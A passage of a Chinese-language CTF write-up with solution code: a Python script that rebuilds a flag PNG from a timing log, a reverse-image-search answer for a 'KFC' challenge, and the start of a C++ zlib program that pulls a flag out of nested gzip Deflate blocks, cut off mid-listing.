<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> delta </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            delta </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1000000000</span></span>
<span><span style="color: #D6DEEB">        lasttime </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> time</span></span>
<span><span style="color: #D6DEEB">        total_delta </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> delta</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> x </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> last:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">x</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">            last </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> x</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">elif</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">result</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0.5</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> total_delta </span><span style="color: #C792EA">/</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">200000000</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">x</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C5E478">hex</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;&#39;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">result</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #D6DEEB">png_header_pos </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span><span style="color: #D6DEEB">i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">True</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> fuzz.</span><span style="color: #B2CCD6">ratio</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">hex</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">8</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">89504e47</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">80</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">and</span><span style="color: #D6DEEB"> fuzz.</span><span style="color: #B2CCD6">ratio</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">hex</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">8</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">89504e47</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">&gt;=</span><span style="color: #D6DEEB"> fuzz.</span><span style="color: #B2CCD6">ratio</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">hex</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">1</span><span style="color: #82AAFF">:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">9</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">89504e47</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">str</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">rjust</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">5</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">hex</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">160</span><span style="color: #D6DEEB">])</span></span>
<span><span style="color: #D6DEEB">        png_header_pos.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        i </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">100</span></span>
<span><span style="color: #D6DEEB">    i </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">hex</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">10</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">break</span></span>
<span></span>
<span><span style="color: #D6DEEB">png_header_pos </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> png_header_pos[</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">:</span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">]</span></span>
<span></span>
<span><span style="color: #D6DEEB">fixed_hex </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4200</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    options </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> pos </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> png_header_pos:</span></span>
<span><span style="color: #D6DEEB">        options.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">hex</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">pos </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> i</span><span style="color: #D6DEEB">])</span></span>
<span><span style="color: #D6DEEB">    fixed_hex.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">max</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">set</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">options</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">key</span><span style="color: #C792EA">=</span><span style="color: #82AAFF">options.count</span><span style="color: #D6DEEB">))</span></span>
<span></span>
<span><span style="color: #D6DEEB">fixed_hex </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;&#39;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">fixed_hex</span><span style="color: #D6DEEB">).</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">ae426082</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">ae426082</span><span style="color: #D9F5DD">&#39;</span></span>
<span><span style="color: #D6DEEB">png </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> codecs.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">fixed_hex</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">hex</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #C5E478">open</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">flag3.png</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">wb</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">).</span><span style="color: #B2CCD6">write</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">png</span><span style="color: #D6DEEB">)</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">import</span><span style="color: #403F53"> codecs</span></span>
<span><span style="color: #994CC3">from</span><span style="color: #403F53"> rapidfuzz </span><span style="color: #994CC3">import</span><span style="color: #403F53"> fuzz</span></span>
<span></span>
<span><span style="color: #403F53">result </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span></span>
<span><span style="color: #994CC3">with</span><span style="color: #403F53"> </span><span style="color: #4876D6">open</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">flag3.log</span><span style="color: #111111">&#39;</span><span style="color: #403F53">) </span><span style="color: #994CC3">as</span><span style="color: #403F53"> log:</span></span>
<span><span style="color: #403F53">    lasttime </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span></span>
<span><span style="color: #403F53">    last </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;&#39;</span></span>
<span><span style="color: #403F53">    total_delta </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> line </span><span style="color: #994CC3">in</span><span style="color: #403F53"> log:</span></span>
<span><span style="color: #403F53">        time, x </span><span style="color: #994CC3">=</span><span style="color: #403F53"> line.</span><span style="color: #0C969B">split</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">        time </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #4876D6">time</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        delta </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53"> </span><span style="color: #994CC3">if</span><span style="color: #403F53"> lasttime </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53"> </span><span style="color: #994CC3">else</span><span style="color: #403F53"> time </span><span style="color: #994CC3">-</span><span style="color: #403F53"> lasttime</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> delta </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            delta </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1000000000</span></span>
<span><span style="color: #403F53">        lasttime </span><span style="color: #994CC3">=</span><span style="color: #403F53"> time</span></span>
<span><span style="color: #403F53">        total_delta </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> delta</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> x </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> last:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">x</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">            last </span><span style="color: #994CC3">=</span><span style="color: #403F53"> x</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">elif</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">result</span><span style="color: #403F53">) </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">0.5</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> total_delta </span><span style="color: #994CC3">/</span><span style="color: #403F53"> </span><span style="color: #AA0982">200000000</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">x</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #4876D6">hex</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;&#39;</span><span style="color: #403F53">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #4876D6">result</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #403F53">png_header_pos </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span><span style="color: #403F53">i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span><span style="color: #994CC3">while</span><span style="color: #403F53"> </span><span style="color: #BC5454">True</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> fuzz.</span><span style="color: #0C969B">ratio</span><span style="color: #403F53">(</span><span style="color: #4876D6">hex</span><span style="color: #403F53">[</span><span style="color: #4876D6">i:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">8</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">89504e47</span><span style="color: #111111">&#39;</span><span style="color: #403F53">) </span><span style="color: #994CC3">&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">80</span><span style="color: #403F53"> </span><span style="color: #994CC3">and</span><span style="color: #403F53"> fuzz.</span><span style="color: #0C969B">ratio</span><span style="color: #403F53">(</span><span style="color: #4876D6">hex</span><span style="color: #403F53">[</span><span style="color: #4876D6">i:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">8</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">89504e47</span><span style="color: #111111">&#39;</span><span style="color: #403F53">) </span><span style="color: #994CC3">&gt;=</span><span style="color: #403F53"> fuzz.</span><span style="color: #0C969B">ratio</span><span style="color: #403F53">(</span><span style="color: #4876D6">hex</span><span style="color: #403F53">[</span><span style="color: #4876D6">i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">1</span><span style="color: #4876D6">:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">9</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">89504e47</span><span style="color: #111111">&#39;</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">str</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">rjust</span><span style="color: #403F53">(</span><span style="color: #AA0982">5</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> hex</span><span style="color: #403F53">[</span><span style="color: #4876D6">i:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">160</span><span style="color: #403F53">])</span></span>
<span><span style="color: #403F53">        png_header_pos.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        i </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">100</span></span>
<span><span style="color: #403F53">    i </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> i </span><span style="color: #994CC3">&gt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">hex</span><span style="color: #403F53">) </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">10</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">break</span></span>
<span></span>
<span><span style="color: #403F53">png_header_pos </span><span style="color: #994CC3">=</span><span style="color: #403F53"> png_header_pos[</span><span style="color: #AA0982">0</span><span style="color: #403F53">:</span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">]</span></span>
<span></span>
<span><span style="color: #403F53">fixed_hex </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">0</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4200</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    options </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> pos </span><span style="color: #994CC3">in</span><span style="color: #403F53"> png_header_pos:</span></span>
<span><span style="color: #403F53">        options.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">hex</span><span style="color: #403F53">[</span><span style="color: #4876D6">pos </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> i</span><span style="color: #403F53">])</span></span>
<span><span style="color: #403F53">    fixed_hex.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">max</span><span style="color: #403F53">(</span><span style="color: #4876D6">set</span><span style="color: #403F53">(</span><span style="color: #4876D6">options</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">key</span><span style="color: #994CC3">=</span><span style="color: #4876D6">options.count</span><span style="color: #403F53">))</span></span>
<span></span>
<span><span style="color: #403F53">fixed_hex </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;&#39;</span><span style="color: #403F53">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #4876D6">fixed_hex</span><span style="color: #403F53">).</span><span style="color: #0C969B">split</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">ae426082</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">ae426082</span><span style="color: #111111">&#39;</span></span>
<span><span style="color: #403F53">png </span><span style="color: #994CC3">=</span><span style="color: #403F53"> codecs.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">(</span><span style="color: #4876D6">fixed_hex</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">hex</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #4876D6">open</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">flag3.png</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">wb</span><span style="color: #111111">&#39;</span><span style="color: #403F53">).</span><span style="color: #0C969B">write</span><span style="color: #403F53">(</span><span style="color: #4876D6">png</span><span style="color: #403F53">)</span></span></code></pre></div></section>
<p>得到的 PNG 如下<span class="mojikumi-line-end">：</span></p>
<p><picture><source type="image/webp" srcset="/assets/mc-flag3.28b6b645.webp"><img srcset="/assets/mc-flag3.71172dce.png" loading="lazy" src="/assets/mc-flag3.71172dce.png" width="397" height="22" alt="flag3"></picture></p>
<h3 id="kfc" class="heading"><a href="#kfc" class="heading-anchor" aria-label="章节： KFC" tabindex="-1"></a><span>KFC</span></h3>
<p>使用 Google 搜索附件图片即可得到店名<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/kfc-search.c7967afc.webp"><img srcset="/assets/kfc-search.ae700e19.png" loading="lazy" src="/assets/kfc-search.ae700e19.png" width="1168" height="681" alt="图片搜索"></picture></p>
<p><picture><source type="image/webp" srcset="/assets/kfc-flag.1c7938d0.webp"><img srcset="/assets/kfc-flag.6d44703f.png" loading="lazy" src="/assets/kfc-flag.6d44703f.png" width="716" height="156" alt="flag"></picture></p>
<h3 id="未来磁盘" class="heading"><a href="#未来磁盘" class="heading-anchor" aria-label="章节： 未来磁盘" tabindex="-1"></a><span>未来磁盘</span></h3>
<h4 id="level-1-2" class="heading"><a href="#level-1-2" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>gzip 使用 Deflate<span class="mojikumi-line-end">，</span>而 Deflate stream 由多个 block 构成<span class="mojikumi-line-end">，</span>可以找到位于中央<span class="mojikumi-line-end">、</span>和其他 block 长得不一样的 block<span class="mojikumi-line-end">，</span>它就是包含了 flag 的 block<span class="mojikumi-line-end">，</span>可以将其解压而丢弃其他 block<span class="mojikumi-line-end">，</span>循环进行这个过程直到得到 flag<span class="mojikumi-line-end">。</span></p>
<p>解压出的东西需要进一步解压<span class="mojikumi-line-end">，</span>此时可以通过枚举找到解压出的这个东西里一个 block 的开头<span class="mojikumi-line-end">。</span>需要注意的是 Deflate stream 以 bit 而非 byte 为单位<span class="mojikumi-line-end">。</span>数据中可能包含向前的引用<span class="mojikumi-line-end">，</span>所以从中间一个 block 开始解压可能报错<span class="mojikumi-line-end">，</span>可以在已经解压了开头若干 block 的基础上进行解压<span class="mojikumi-line-end">。</span>总之实现起来很麻烦<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">，</span>而且应该有哪不完善<span class="mojikumi-line-end">，</span>不然 level 2 按理来说也能搞出来<span class="mojikumi-line-end">。</span></p>
<p>运行下面的代码前需要先解压一遍得到内部一层的 gz 文件<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-4"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-4--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">zlib.h</span><span style="color: #D9F5DD">&gt;</span></span>
<span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">cassert</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">cstdio</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">cstdlib</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">cstring</span><span style="color: #D9F5DD">&gt;</span></span>
<span></span>
<span><span style="color: #C792EA">using</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">namespace</span><span style="color: #D6DEEB"> std;</span></span>
<span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> CHUNK </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">28</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #C792EA">unsigned</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">char</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">in</span><span style="color: #D6DEEB">[CHUNK], </span><span style="color: #C5E478">out</span><span style="color: #D6DEEB">[CHUNK];</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">main</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">auto</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">s </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">new</span><span style="color: #D6DEEB"> z_stream;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">zalloc</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> Z_NULL;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">zfree</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> Z_NULL;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">opaque</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> Z_NULL;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> Z_NULL;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">inflateInit2</span><span style="color: #D6DEEB">(s, </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">15</span><span style="color: #D6DEEB">);</span></span>
<span></span>
<span><span style="color: #D6DEEB">    FILE </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">input </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">fopen</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">gzip-flag1-2.gz</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">rb</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">fseek</span><span style="color: #D6DEEB">(input, </span><span style="color: #F78C6C">10</span><span style="color: #D6DEEB">, SEEK_SET);</span></span>
